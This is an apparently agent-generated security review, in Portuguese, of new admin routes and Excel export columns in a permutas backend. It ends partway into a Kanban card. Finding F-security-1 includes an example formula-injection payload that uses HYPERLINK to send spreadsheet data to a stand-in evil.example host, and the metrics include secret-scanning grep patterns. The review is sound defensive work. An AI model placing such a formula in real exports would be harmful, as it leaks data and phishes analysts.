---
qa: Security
qa_slug: security
run_id: 2026-09-15-1835-permutas-excecao-manual
agent: qa-security
generated_at: 2026-09-15T18:55:00Z
scope: backend
score: 8.0
findings_count: 7
cards_count: 2
---

# Security — Regis-Review

## 1. Cenário Geral (Bass General Scenario aplicado ao nf-projects)

| Source | Stimulus | Artifact | Environment | Response | Response Measure |
|---|---|---|---|---|---|
| (a) Analista `admin` autenticado (ou insider com JWT `role=admin`) OU (b) analista `admin` malicioso que redige uma `justificativa` capaz de virar fórmula ativa no `.xlsx` OU (c) atacante externo tentando falsificar autor/data via corpo JSON | Chama `POST/DELETE /permutas/adiantamentos/:docCod/excecao-manual` (marca/desfaz a exceção "permutado fora do painel"), depois `GET /permutas/relatorios/adiantamentos` para outra analista abrir o Excel; ou envia `criadoPor:"forjado"` no corpo esperando que o servidor confie | `src/backend/routes/permutas.ts` (novas rotas), `src/backend/domain/service/permutas/ExcecaoPermutaService.ts`, `src/backend/domain/repository/permutas/ExcecaoPermutaRepository.ts`, `src/backend/domain/service/permutas/RelatorioExportService.ts` (novas colunas `Exceção manual`/`Justificativa`/`Autor`/`Data`), `src/backend/migrations/0059_excecao_permuta.sql`, `src/frontend/app/permutas/components/{ExcecaoManualDialog,DesfazerExcecaoDialog,VisaoGeralTable}.tsx` | Produção, canal HTTPS, JWT Supabase válido, PostgreSQL via pooler; `CONEXOS_WRITE_ENABLED=false` (D6 da ADR-0047 — a exceção nunca escreve no ERP) | Rotas de mutação recusam sem `role=admin` (403); recusam 401 se o token não carregar `sub` nem `email`; ignoram `criadoPor` do corpo (sempre grava o do JWT); Zod na fronteira força justificativa 10–500 chars pós-trim; CHECK `permuta_excecao_manual_justificativa_tamanho` no banco replica o limite; soft-delete com CHECK `remocao_pareada` impede autor sem data e vice-versa; SQL 100% parametrizado (repo + reclassificação transacional); leitura de `/gestao` mantém a política pré-existente (autenticado, sem RBAC) — o delta amplia marginalmente o payload (`excecaoManual.{justificativa,criadoPor}`) | 2/2 rotas novas gateadas por `requireRole('admin')`; 2/2 rotas rejeitam identidade ausente com 401 (nunca gravam `criadoPor='unknown'`); 100% dos placeholders SQL nomeados (0 template com `${…}` em `SELECT/INSERT/UPDATE/DELETE`); 0 chamadas ao Conexos na trilha da exceção; 0 `dangerouslySetInnerHTML`/`innerHTML` no delta; 0 credenciais / .env / tfstate no diff; **2 células do `.xlsx` (`Justificativa exceção`, `Autor exceção`) carregam texto de usuário SEM escape de fórmula (`=`/`+`/`-`/`@`/`\t`/`\r`)** |

O delta introduz **duas rotas admin** (`POST/DELETE /permutas/adiantamentos/:docCod/excecao-manual`), **um repositório** com soft-delete auditável, **uma reclassificação transacional** com trava otimista, e **quatro colunas novas no exportador Excel** que carregam a justificativa e o autor da exceção. A superfície de risco fica concentrada em três seams: (1) contrato de identidade do autor (JWT vs. body — resolvido no servidor), (2) validação da justificativa (Zod + CHECK), (3) renderização da justificativa/autor em xlsx que **é baixado por outra analista** (D5 da ADR-0047).

## 2. Métricas observadas

| Métrica | Valor atual | Alvo | Status | Fonte |
|---|---|---|---|---|
| Segredos hardcoded introduzidos pelo delta (`password\|secret\|token\|api[_-]?key\|credential\|AKIA…`) | 0 | 0 | ✅ | `grep -rEn '(password\|secret\|token\|api[_-]?key\|credential\|AKIA)' <8 arquivos do delta>` → 0 hits |
| `.env` / `*.tfstate` / `credentials.json` no diff | 0 | 0 | ✅ | `git diff --stat origin/main..HEAD` — nenhum arquivo com esses padrões |
| Novos endpoints do delta gateados por `requireRole('admin')` | 2 de 2 | 100% | ✅ | `src/backend/routes/permutas.ts:453,489` (POST + DELETE de `excecao-manual`) |
| Novos endpoints do delta que aceitam autor via corpo JSON | 0 | 0 | ✅ | `src/backend/routes/permutas.ts:169-171` (Zod só carrega `justificativa`); teste `permutas.test.ts:656-676` prova que `criadoPor:"forjado"` no corpo é ignorado (`user-abc` do JWT prevalece) |
| Novos endpoints do delta que recusam identidade ausente com 401 | 2 de 2 | 2 de 2 | ✅ | `src/backend/routes/permutas.ts:437-447` (`autorDoToken` → `undefined` sem `sub` nem `email`; `IDENTIDADE_AUSENTE` = 401, nunca cai em `'unknown'`); teste `permutas.test.ts:695-712` |
| Zod na fronteira das novas rotas (`safeParse` do body/query) | 1 schema, 2 rotas cobertas (o DELETE não tem body) | 100% dos boundaries | ✅ | `src/backend/routes/permutas.ts:169-171` (`excecaoManualBodySchema`), `:457-461` (safeParse), `:490-496` (DELETE só usa `req.params.docCod` + `autorDoToken`) |
| Faixa de tamanho da justificativa validada em quantas camadas | 2 (Zod na rota + CHECK no banco) | ≥ 2 | ✅ | `src/backend/routes/permutas.ts:169-171` (`min(10).max(500)`) + `src/backend/migrations/0059_excecao_permuta.sql:52-56` (`char_length BETWEEN 10 AND 500`) |
| Template literals com `${…}` de valor em `SELECT/INSERT/UPDATE/DELETE` no delta | 0 | 0 | ✅ | `grep -nE 'SELECT\|INSERT\|UPDATE\|DELETE' <ExcecaoPermutaRepository.ts + reclassificarAdiantamento em PermutaRelationalRepository.ts>` → 4 comandos, todos com `$nome` (bind nomeado); único `${…}` em SQL do repo é o `tuples.join(', ')` de UPSERT (fora do delta desta feature, cada `$k_${i}` é NOME de placeholder, não valor) |
| Contrato de imutabilidade do autor (`criadoPor`/`removidoPor` só do JWT, nunca do body) | 100% (2/2 rotas) | 100% | ✅ | `src/backend/routes/permutas.ts:462,492` + `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:117-165,172-194` (services recebem `criadoPor`/`removidoPor` como parâmetro; nada é lido de `input` fora do que o serviço deixa passar do JWT) |
| Trilha imutável do soft-delete (`remocao_pareada` CHECK) | Presente — autor sem data ou data sem autor é rejeitado pelo Postgres | Presente | ✅ | `src/backend/migrations/0059_excecao_permuta.sql:58-63` (`ADD CONSTRAINT permuta_excecao_manual_remocao_pareada CHECK ((removido_em IS NULL) = (removido_por IS NULL))`) |
| Rotas de escrita no Conexos disparadas pela exceção | 0 | 0 (D6 da ADR-0047) | ✅ | `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:56-66` (construtor NÃO injeta cliente Conexos); grep `ConexosClient\|conexos.` no serviço → 0 hits |
| Concorrência entre 2 admins marcando a mesma exceção | Índice parcial `uq_permuta_excecao_manual_ativa` + trava otimista `reclassificarAdiantamento` (WHERE de origem) — 23505 vira 409 no serviço | Coberta em servidor + banco | ✅ | `src/backend/migrations/0059_excecao_permuta.sql:66-68`; `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:135-156` (try/catch de `isUniqueViolation`); `src/backend/domain/repository/permutas/PermutaRelationalRepository.ts:621-642` (WHERE `estado_elegibilidade=$deEstado AND motivo_bloqueio=$deMotivo` — se a linha mudou, rowCount 0 → tudo faz rollback) |
| XSS (`dangerouslySetInnerHTML`/`innerHTML`) nos arquivos do delta | 0 | 0 | ✅ | `grep -rn 'dangerouslySetInnerHTML\|innerHTML' src/frontend` → 0 hits em todo o frontend |
| Uso de `localStorage`/`sessionStorage` no delta | 0 | 0 | ✅ | `grep -rn 'localStorage\|sessionStorage' src/frontend/app/permutas/components/{ExcecaoManualDialog,DesfazerExcecaoDialog,VisaoGeralTable}.tsx src/frontend/app/permutas/components/useExcecaoManual.ts src/frontend/lib/api.ts` → 0 hits |
| **Escape de fórmula (`=`/`+`/`-`/`@`/`\t`/`\r`) nas 2 células do xlsx que carregam texto de usuário** (`excecaoJustificativa`, `excecaoAutor`) | **0 células escapadas / 2 células com input de usuário** | 2 de 2 escapadas | ❌ | `src/backend/domain/service/permutas/RelatorioExportService.ts:448-466` (`celulasExcecao`) escreve `excecao.justificativa` e `excecao.criadoPor` crus; `:485-487` (`sheet.addRow(linha as Record<string, CelulaValor>)`) passa o objeto direto ao ExcelJS sem transformação; Zod (`permutas.ts:169-171`) NÃO restringe o primeiro caractere da justificativa; nenhum teste com `=`/`+`/`-`/`@`/`\t`/`\r` na justificativa em `RelatorioExportService.test.ts` |
| PII exposta em `GET /permutas/gestao` (leitura sem RBAC — débito pré-existente ADR-0043) — campos novos do delta | +2 campos (`excecaoManual.justificativa` texto livre 10–500 chars, `excecaoManual.criadoPor` = `sub` ou email do JWT do analista) | 0 sem ADR | ⚠️ | `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:159-163` (o serviço não vaza no log — a justificativa "fica no banco, não no log"), MAS o GestaoService acopla `excecaoManual` ao payload (`p.excecaoManual` renderizado em `VisaoGeralTable.tsx:441-446`); rota `/permutas/gestao` sem `requireRole` — `permutas.ts:518-526` |
| Fallback do autor cair em `'unknown'` (evita autor forjável quando o token não carrega identidade) | 0 (as rotas novas devolvem 401; NÃO usam o padrão `?? 'unknown'` das outras rotas — decisão explícita I-Exc-4) | 0 | ✅ | `src/backend/routes/permutas.ts:437-447` (compare com `:204,238,303,373,563,594,640,670,729,756,783,810,839` onde outras rotas caem em `'unknown'`); comentário docblock `:434-436` explica a diferença |
| Log de segredos ou justificativa/autor por engano | 0 (o service só loga `docCod` + `criadoPor` = ID já público na trilha; a justificativa é preservada em banco) | 0 | ✅ | `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:158-163,189-193` (log `data: { docCod, criadoPor }` — sem `justificativa`) |
| CloudTrail / GuardDuty / IAM least-privilege | ⚠️ **Não medível** — repo não tem `infra/` (deploy Render/Vercel), auth Supabase JWT (sem IAM AWS) | — | N/A | `ls infra/ 2>&1` → não existe |
| `npm audit` (CVEs) | ⚠️ **Não coletado** — modo `--quick` (shared-metrics linha 1) | crítico=0, alto=0 | N/A | — |

## 3. Tactics — Cobertura no nf-projects

| Tactic (Bass) | Implementação atual | Status | Evidência |
|---|---|---|---|
| Detect Intrusion | Trilha de autor/data escreve `criado_por` no INSERT e `removido_por`/`removido_em` no soft-delete; identidade vem SÓ do JWT (401 quando ausente). Sem detecção de padrão anômalo (múltiplas exceções por hora, por analista). | ⚠️ parcial | `src/backend/domain/repository/permutas/ExcecaoPermutaRepository.ts:60-84`; `src/backend/routes/permutas.ts:437-447` |
| Detect Service Denial | Fora de escopo do delta — as rotas são de baixa cardinalidade (1 exceção por adto), sem fan-out ao Conexos. `heavyRouteLimiter` NÃO é aplicado (não é fan-out), mas o middleware global de rate-limit continua ativo. | N/A | Cross-QA — ver Availability/Performance |
| Verify Message Integrity | (a) `criadoPor` vem do JWT verificado (`autorDoToken`), NÃO do body — o teste `permutas.test.ts:656-676` grava esse contrato; (b) trava otimista `reclassificarAdiantamento` (WHERE de origem + `AND NOT stale`) barra escrita concorrente sobre linha que mudou; (c) CHECK `remocao_pareada` impede `removido_por` sem `removido_em`. | ✅ presente | `src/backend/routes/permutas.ts:437-447`; `src/backend/domain/repository/permutas/PermutaRelationalRepository.ts:621-642`; `src/backend/migrations/0059_excecao_permuta.sql:58-63` |
| Detect Message Delay | N/A para essa trilha (síncrona). O `stale=TRUE` na tabela de adtos age como detector de "mensagem em atraso" da ingestão — o `reclassificarAdiantamento` já filtra `AND NOT stale` (`PermutaRelationalRepository.ts:632`). | ✅ presente | idem |
| Identify Actors | JWT Supabase → `req.user`; propagado ao `criadoPor`/`removidoPor` (sem `?? 'unknown'` — decisão I-Exc-4). | ✅ presente | `src/backend/http/auth.ts:60-73`; `src/backend/routes/permutas.ts:437-447` |
| Authenticate Actors | Middleware global de auth (Supabase JWT, `buildAuthMiddleware` — HS256 shared secret + JWKS assimétrico; audience `authenticated`). Não alterado pelo delta. | ✅ presente | `src/backend/http/auth.ts:118-196` |
| Authorize Actors | `requireRole('admin')` nas 2 novas rotas (`permutas.ts:454,489`); teste `permutas.test.ts:791-843` exercita `role='authenticated'` → 403 para as duas mutações da exceção. Leitura `/permutas/gestao` continua autenticada mas sem RBAC (débito pré-existente ADR-0043). | ✅ presente (mutações) / ⚠️ parcial (leitura) | idem + `src/backend/routes/permutas.ts:518-526` |
| Limit Access | Rotas de escrita gateadas por `admin`; leitura de projeção inteira aberta a qualquer autenticado. Delta amplia marginalmente a projeção (adiciona `excecaoManual` ao payload). | ⚠️ parcial | `src/backend/routes/permutas.ts:518-526`; `src/frontend/app/permutas/components/VisaoGeralTable.tsx:441-446` (renderização) |
| Limit Exposure | Nenhuma escrita no ERP (D6 da ADR-0047 — o service NÃO injeta cliente Conexos), então uma exceção mal-registrada não vaza para a trilha contábil do Conexos. A "explosão máxima" fica em uma tabela nossa (`permuta_excecao_manual`) com no máximo 1 ativa/adto (índice parcial). | ✅ presente | `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:56-66` (sem `ConexosClient` no construtor); `src/backend/migrations/0059_excecao_permuta.sql:66-68` |
| Encrypt Data | Não medível — TLS é do Render; segredos em Supabase (env externo). Delta não muda. | N/A | — |
| Separate Entities | Multi-tenant AWS-por-cliente é estado-alvo (CLAUDE.md); repo hoje é single-tenant Columbia via Supabase. Delta não muda. | N/A | — |
| Change Default Settings | N/A — o delta não introduz env var nova nem flag operacional. | N/A | — |
| Validate Input | Zod na fronteira (`excecaoManualBodySchema`, 10–500 chars pós-trim) + CHECK no banco (mesma faixa, replicado). SQL 100% parametrizado (`$nome`). `docCod` de URL passa por `String(req.params.docCod)`. **Falta**: nenhuma sanitização de fórmula em xlsx (`=`/`+`/`-`/`@`/`\t`/`\r`) para as células `Justificativa exceção` e `Autor exceção`. | ⚠️ parcial | `src/backend/routes/permutas.ts:169-171,457-461`; `src/backend/migrations/0059_excecao_permuta.sql:52-56`; `src/backend/domain/repository/permutas/ExcecaoPermutaRepository.ts`; `src/backend/domain/service/permutas/RelatorioExportService.ts:448-466` (célula do xlsx crua) |
| Revoke Access | O soft-delete `desfazer` é a "revogação" da exceção (D3 reverso da ADR-0047) — deixa trilha e reclassifica a linha na MESMA transação. | ✅ presente | `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:172-194` |
| Lock Computer | N/A | N/A | — |
| Inform Actors | Erros de domínio traduzidos (`ExcecaoPermutaRecusadaError.userMessage` em pt-BR — guarda 422, ja-ativa 409, adto fora do backlog 404); rota devolve `{ error: code, message: userMessage }`; frontend joga no toast via `ExcecaoManualRecusadaError`. | ✅ presente | `src/backend/domain/errors/ExcecaoPermutaRecusadaError.ts`; `src/backend/routes/permutas.ts:472-482,502-512`; `src/frontend/lib/api.ts:273-321` |
| Restore (overlap Availability) | Migration idempotente (`IF NOT EXISTS`, `DROP CONSTRAINT IF EXISTS`+`ADD`) — o docblock declara `sem script de reverse` porque só cria tabela/índice e redefine CHECKs sem tocar dado. Rollback do código sozinho volta ao comportamento anterior sem risco de data-loss. | ✅ presente | `src/backend/migrations/0059_excecao_permuta.sql:22-38` |
| Audit Trail | INSERT registra `criado_por` + `criado_em`; soft-delete registra `removido_por` + `removido_em` (CHECK impede pareamento inválido); nenhum caminho DELETE no repository (só INSERT + UPDATE soft). O log estruturado da rota grava `docCod` + `criadoPor`/`removidoPor` (sem justificativa — preservada em banco). | ✅ presente | `src/backend/domain/repository/permutas/ExcecaoPermutaRepository.ts:55-84`; `src/backend/migrations/0059_excecao_permuta.sql:58-63`; `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:158-163,189-193` |

## 4. Findings (achados)

### F-security-1: `Justificativa exceção` e `Autor exceção` são escritos crus no xlsx — vetor de fórmula/hyperlink injection contra a analista que baixa o relatório

- **Severidade**: P1 (injeção com blast-radius limitado — ExcelJS escreve como string inline por default, mas Excel/LibreOffice em conversão CSV, autofill e alguns fluxos "Data > Import" ainda avaliam; parent explicitamente flagou a superfície)
- **Tactic violada**: Validate Input (defense-in-depth de saída)
- **Localização**: `src/backend/domain/service/permutas/RelatorioExportService.ts:448-466` (`celulasExcecao`); `:485-487` (`sheet.addRow(linha as Record<string, CelulaValor>)`); `src/backend/routes/permutas.ts:169-171` (Zod não restringe primeiro caractere)
- **Evidência (objetiva)**:
  ```typescript
  // permutas.ts:169-171
  const excecaoManualBodySchema = z.object({
      justificativa: z.string().trim().min(10).max(500),
  });

  // RelatorioExportService.ts:448-466 — as 4 células da exceção manual
  private celulasExcecao = (p: PermutaPendente): Record<string, CelulaValor> => {
      const excecao = p.excecaoManual;
      if (excecao === undefined) { …null… }
      return {
          excecaoManual: excecao.ativa
              ? 'Permutado fora do painel (exceção manual)'
              : 'Registrada, não aplicada',
          excecaoJustificativa: excecao.justificativa, // ← texto cru do admin
          excecaoAutor: excecao.criadoPor,             // ← sub OU email do JWT
          excecaoData: this.soData(excecao.criadoEm),
      };
  };
  // :485-487
  for (const linha of definicao.linhas) {
      sheet.addRow(linha as Record<string, CelulaValor>);
  }
  ```
  Um analista `admin` legitimamente autenticado pode redigir `justificativa = '=HYPERLINK("https://evil.example/x?a="&A1,"Ver detalhe")'` (28 chars, dentro do intervalo 10–500). Quando outra analista `exportar → adiantamentos.xlsx` e abrir em Excel/LibreOffice, o comportamento varia com a versão / locale / fluxo de importação — a mitigação OWASP canônica é prefixar `'` (apóstrofo) em qualquer célula-texto que comece com `=`/`+`/`-`/`@`/`\t`/`\r`. Nenhum teste em `RelatorioExportService.test.ts:239-330` exercita justificativa iniciando com esses caracteres. O `Autor exceção` também é vulnerável: `sub` do JWT Supabase é UUID (seguro), mas o fallback `email` (rota `permutas.ts:441`) aceita qualquer string RFC 5322 — RFC permite `=` em local-part (raro mas legal), e um IdP customizado no futuro poderia entregar strings arbitrárias.
- **Impacto técnico**: com ExcelJS `addRow(string)` a célula é do tipo inline-string por default (Excel não deve avaliar como fórmula na abertura direta). Mas o mesmo xlsx: (a) reaberto após "Save as CSV" vira `=HYPERLINK(...)` interpretado pelo próximo consumidor, (b) em LibreOffice com "Detect special numbers" ligado o comportamento é diferente, (c) fluxos de Power Query / Get Data promovem o texto a fórmula. É defesa-em-profundidade — parent listou explicitamente como preocupação.
- **Impacto de negócio**: o exportador de adiantamentos é o relatório que sai do painel para stakeholders (D5 da ADR-0047 — o `Excel` é a superfície de comunicação com quem não abre a UI). Um hyperlink camuflado como texto de auditoria vira phishing dirigido a analistas financeiras, com o adto real (R$ 20 mi 8721 do caso da ADR-0047) como isca — anexo assinado por uma colega, aberto no Excel corporativo. Custo de mitigação é 3 linhas.
- **Métrica de baseline**: **0 células escapadas / 2 células com input de usuário** (`excecaoJustificativa`, `excecaoAutor`). 0 casos de teste com `=`/`+`/`-`/`@`/`\t`/`\r` no início da justificativa.

### F-security-2: Autor da exceção resolvido SÓ pelo JWT (`sub`→`email`, 401 sem nenhum dos dois) — `criadoPor` do corpo é ignorado com teste explícito

- **Severidade**: P3 (positivo — não gera card)
- **Tactic**: Verify Message Integrity + Identify Actors
- **Localização**: `src/backend/routes/permutas.ts:437-447,462-466,492-496`; teste `src/backend/routes/permutas.test.ts:656-712`
- **Evidência (objetiva)**:
  ```typescript
  // permutas.ts:437-447 — helper que NÃO cai em 'unknown' (contraste com as
  // outras 13 rotas do arquivo, que usam `req.user?.sub ?? req.user?.email ?? 'unknown'`)
  const autorDoToken = (user?: { sub?: string; email?: string }): string | undefined => {
      const sub = user?.sub?.trim();
      if (sub) return sub;
      const email = user?.email?.trim();
      return email ? email : undefined;
  };
  const IDENTIDADE_AUSENTE = {
      error: 'IDENTIDADE_AUSENTE',
      message: 'Não foi possível identificar o usuário no token. Entre de novo e repita a ação.',
  };

  // teste :656-676
  // envia { justificativa, criadoPor: 'forjado' } com Bearer de user-abc
  expect(marcar).toHaveBeenCalledWith({
      docCod: '8721',
      justificativa: JUSTIFICATIVA,
      criadoPor: 'user-abc', // ← nunca 'forjado'
  });
  ```
- **Impacto técnico**: um atacante que consiga corpo JSON válido (Zod já filtra chaves extras porque o schema é `z.object({ justificativa })` — Zod default é strip) não consegue falsificar autoria. O contrato I-Exc-4 (audit trail sem `'unknown'`) é enforçado por 401 na fronteira em vez de valor mágico gravado — a trilha da exceção manual nunca carrega um autor inautêntico.
- **Impacto de negócio**: preserva a auditabilidade contábil da exceção — se aparecer no banco, existe um humano identificado por trás. Contraste com a rota `POST /permutas/eleicao` (`:204`) e outras 12 rotas do arquivo que gravam `'unknown'` quando o token está sem `sub`/`email` — para a exceção, `'unknown'` seria assinatura anônima de decisão contábil de R$ 20 mi, contornando o critério do ADR-0006.
- **Métrica de baseline**: 2/2 rotas novas usam `autorDoToken` (não `?? 'unknown'`); 401 quando ambos vazios; teste com JWT `{sub:'   ', email: undefined}` prova a rejeição.

### F-security-3: SQL 100% parametrizado; INSERT/UPDATE/SELECT da exceção e reclassificação transacional sem template literal

- **Severidade**: P3 (positivo — não gera card)
- **Tactic**: Validate Input (Rule #5 do CLAUDE.md)
- **Localização**: `src/backend/domain/repository/permutas/ExcecaoPermutaRepository.ts:28-84`; `src/backend/domain/repository/permutas/PermutaRelationalRepository.ts:621-642` (novo `reclassificarAdiantamento`)
- **Evidência (objetiva)**:
  ```sql
  -- ExcecaoPermutaRepository.insertAtiva (:59-67)
  INSERT INTO permuta_excecao_manual (adiantamento_doc_cod, justificativa, criado_por)
  VALUES ($adiantamentoDocCod, $justificativa, $criadoPor)

  -- softDeleteAtiva (:75-83)
  UPDATE permuta_excecao_manual
     SET removido_por = $removidoPor, removido_em = now()
   WHERE adiantamento_doc_cod = $adiantamentoDocCod AND removido_em IS NULL

  -- PermutaRelationalRepository.reclassificarAdiantamento (:629-640)
  UPDATE permuta_adiantamento
     SET estado_elegibilidade = $paraEstado, motivo_bloqueio = $paraMotivo
   WHERE doc_cod = $docCod AND NOT stale
     AND estado_elegibilidade = $deEstado AND motivo_bloqueio = $deMotivo
  ```
  4 comandos, 100% com `$nome` (bind nomeado do SqlBuilder). Nenhum `${…}` de valor. O `docCod` chega da URL (`String(req.params.docCod)`) e nunca é interpolado — sempre passa como parâmetro nomeado.
- **Impacto técnico**: 0 vetor de injeção no delta.
- **Impacto de negócio**: baixo — reforça Rule #5.
- **Métrica de baseline**: 0 template literals com `${…}` de valor em `SELECT/INSERT/UPDATE/DELETE` nos 2 arquivos do delta (repository + relational reclassify).

### F-security-4: Justificativa renderizada como texto de nó React (auto-escape) — 0 dangerouslySetInnerHTML no delta e no frontend inteiro

- **Severidade**: P3 (positivo — não gera card)
- **Tactic**: Validate Input (output-side / XSS)
- **Localização**: `src/frontend/app/permutas/components/VisaoGeralTable.tsx:439-446` (renderização em detalhe); `src/frontend/app/permutas/components/ExcecaoManualDialog.tsx:100-131` (input via `<Textarea>` controlado)
- **Evidência (objetiva)**:
  ```tsx
  // VisaoGeralTable.tsx:439-446
  <Campo label="Justificativa" className="col-span-2">
    <span className="whitespace-pre-wrap font-normal">
      {p.excecaoManual.justificativa}   {/* texto de nó — React escapa */}
    </span>
  </Campo>
  <Campo label="Autor">{p.excecaoManual.criadoPor}</Campo>
  <Campo label="Data">{fmtData(p.excecaoManual.criadoEm)}</Campo>
  ```
  `grep -rn 'dangerouslySetInnerHTML\|innerHTML' src/frontend` → **0 hits** no repo inteiro (não só no delta).
- **Impacto técnico**: XSS via DOM na renderização é fechada por design do React. `whitespace-pre-wrap` só afeta layout, não interpretação.
- **Impacto de negócio**: baixo — o corolário é que a auditoria da justificativa preserva formatação (quebras de linha) sem introduzir HTML.
- **Métrica de baseline**: 0 `dangerouslySetInnerHTML` no frontend; 1 renderização direta como texto React (sem `Markdown` / `parse HTML`).

### F-security-5: Trilha da exceção imutável — soft-delete em vez de DELETE, CHECK `remocao_pareada`, índice parcial de unicidade

- **Severidade**: P3 (positivo — não gera card)
- **Tactic**: Audit Trail
- **Localização**: `src/backend/migrations/0059_excecao_permuta.sql:41-68`; `src/backend/domain/repository/permutas/ExcecaoPermutaRepository.ts:20-99`
- **Evidência (objetiva)**:
  ```sql
  -- 0059_excecao_permuta.sql:58-68
  ADD CONSTRAINT permuta_excecao_manual_remocao_pareada
      CHECK ((removido_em IS NULL) = (removido_por IS NULL));

  CREATE UNIQUE INDEX IF NOT EXISTS uq_permuta_excecao_manual_ativa
      ON permuta_excecao_manual (adiantamento_doc_cod)
      WHERE removido_em IS NULL;
  ```
  O repository só expõe `listAtivas` / `findAtiva` (SELECT), `insertAtiva` (INSERT), `softDeleteAtiva` (UPDATE `SET removido_por = $, removido_em = now()`). **Não há `deleteByDocCod` / `truncate`** — o banco fica sem caminho de DELETE via aplicação. Uma exceção "desfeita" continua na tabela com a marca de quem/quando.
- **Impacto técnico**: reforça I-Exc-4 (audit trail no soft-delete). A CHECK impede `UPDATE removido_por='x'` sem `removido_em` — o banco recusa antes do commit.
- **Impacto de negócio**: para uma decisão contábil de R$ 20 mi (o caso 8721), a auditoria fica: (a) registro imutável do INSERT, (b) registro imutável do soft-delete se desfeita, (c) impossível gravar "quem desfez" sem "quando desfez".
- **Métrica de baseline**: 0 caminhos DELETE no repo; 2 CHECKs no banco (`justificativa_tamanho` + `remocao_pareada`); 1 índice parcial de unicidade.

### F-security-6: Trava otimista `reclassificarAdiantamento` + índice parcial cobre corrida entre 2 admins marcando/desfazendo simultaneamente

- **Severidade**: P3 (positivo — não gera card)
- **Tactic**: Verify Message Integrity
- **Localização**: `src/backend/domain/service/permutas/ExcecaoPermutaService.ts:135-156`; `src/backend/domain/repository/permutas/PermutaRelationalRepository.ts:621-642`
- **Evidência (objetiva)**:
  ```typescript
  // ExcecaoPermutaService.marcar :135-156 — dentro de withTransaction
  await this.excecaoRepository.insertAtiva(tx, {...});
  const reclassificadas = await this.relationalRepository.reclassificarAdiantamento(
      tx, { docCod, de: ESTADO_DA_GUARDA, para: ESTADO_DA_EXCECAO },
  );
  if (reclassificadas === 0) {
      throw new ExcecaoPermutaRecusadaError({ tipo: 'concorrencia', docCod });
      // → ROLLBACK: nem a exceção fica gravada
  }
  ```
  A UPDATE em `PermutaRelationalRepository.ts:629-640` só afeta a linha se `estado_elegibilidade = $deEstado AND motivo_bloqueio = $deMotivo` — se a ingestão mudou a linha no meio, rowCount 0 e a transação toda faz rollback. A segunda tentativa concorrente vai bater no índice parcial (23505) que o `isUniqueViolation` traduz em 409.
- **Impacto técnico**: dois admins clicando "Marcar" no mesmo adto no mesmo instante NÃO conseguem produzir duas linhas ativas — o banco garante 0 ou 1. Se a ingestão passar entre a leitura da guarda e o INSERT, o rollback preserva o dado.
- **Impacto de negócio**: elimina o cenário de "duas justificativas concorrentes" na mesma exceção — o autor da segunda tentativa vê a mensagem "já ativa" com clareza, sem gravar uma segunda linha órfã.
- **Métrica de baseline**: 3 camadas de defesa contra corrida (índice parcial no banco + WHERE de origem + rollback transacional); 0 estados intermediários gravados em caso de conflito.

### F-security-7: Payload de `GET /permutas/gestao` agora vaza `justificativa` (texto livre) e `criadoPor` (email do analista) — leitura sem RBAC (débito pré-existente, agravado marginalmente pelo delta)

- **Severidade**: P2 (não é regressão nova — o mesmo débito existe desde ADR-0043 e virou card no ciclo anterior `2026-09-15-0207-permutas-saldo-ordem-centavos/security.md#security-2`; esta feature amplia a projeção com **dois campos** novos que carregam PII)
- **Tactic violada**: Limit Access, Authorize Actors (granularidade)
- **Localização**: `src/backend/routes/permutas.ts:518-526` (`GET /permutas/gestao` sem `requireRole`); `src/frontend/app/permutas/components/VisaoGeralTable.tsx:441-446` (renderização); interface `PermutaPendente.excecaoManual` (adicionada pelo delta)
- **Evidência (objetiva)**:
  ```typescript
  // permutas.ts:518-526 — NÃO tem requireRole (compare com :454,489 das mutações)
  router.get(
      '/gestao',
      asyncHandler(async (req, res) => {
          await bootstrapAppContainer();
          const service = container.resolve(GestaoPermutasService);
          const gestao = await service.exporGestao(req.requestId);
          res.json(gestao);
      }),
  );
  ```
  Um usuário autenticado com role qualquer (ex. `viewer`, `authenticated`) recebe agora, em cada linha `ja-permutado` com `motivoBloqueio = 'permutado-fora-do-painel'` E em cada linha `bloqueada/sem-saldo-permutar` com exceção não-aplicada, um objeto `excecaoManual: { justificativa, criadoPor, criadoEm, ativa }`. O `criadoPor` pode ser email quando o JWT tem só `email` (`autorDoToken` cai no fallback — `permutas.ts:441`). Emails são PII sob a LGPD; texto livre 10–500 chars pode conter nome de outros clientes, valores em BRL, referências internas.
- **Impacto técnico**: nenhum vetor de mutação; a leitura já vazava outros campos sensíveis (BRL/USD, importador) para qualquer autenticado. O delta amplia **em 2 campos** (`justificativa` livre + `criadoPor` que pode ser email) o payload de duas classes de linha. Em blast-radius: 1 adto (o 8721 do caso da ADR-0047) hoje; N adtos se o uso do "permutado fora do painel" crescer além de casos isolados (o próprio ADR-0047 §Consequências prevê reabrir a alternativa (a) se o uso escalar).
- **Impacto de negócio**: idem o card `[security-2]` do ciclo `2026-09-15-0207` — cada feature amplia o payload de `/gestao` marginalmente; sem fechar o débito pré-existente (formalizar ADR OU aplicar `requireRole('admin' | 'analyst')`), a projeção acumula campos PII sem revisão de política. O texto livre da justificativa é o campo mais novo e menos previsível — um `viewer` de outra unidade vê o motivo interno pelo qual o analista contábil marcou uma exceção de R$ 20 mi.
- **Métrica de baseline**: 1 rota de leitura sensível sem RBAC (idem ADR-0043); **+2 campos** PII agora no payload (`excecaoManual.justificativa`, `excecaoManual.criadoPor`); campos condicionalmente presentes em 2 classes de linha (`ja-permutado/permutado-fora-do-painel` e `bloqueada/sem-saldo-permutar` com exceção registrada mas não aplicada).

## 5. Cards Kanban

### [security-1] Sanitizar prefixo de fórmula nas células de texto de usuário do exportador Excel (`Justificativa exceção`, `Autor exceção`)

- **Problema**
